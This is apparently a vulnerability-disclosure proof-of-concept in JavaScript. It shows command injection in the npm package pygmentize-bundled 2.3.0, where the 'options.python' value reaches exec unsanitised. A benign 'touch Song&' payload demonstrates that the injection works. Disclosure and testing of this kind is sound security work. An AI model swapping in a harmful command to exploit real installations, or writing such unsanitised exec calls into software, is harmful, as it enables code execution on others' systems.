/**
 * pygmentize-bundled@2.3.0 is vulnerable to command injection.
 * the injection point is located in line 127 of file index.js
 * which is called by the default function of this package
 * the variable "options.python" is used as part of the arg of exec function without 
 * any sanitization 
 */
var root = require("pygmentize-bundled");
var attack_code = "touch Song&";
var options ={
  "python": attack_code
}
root(options);
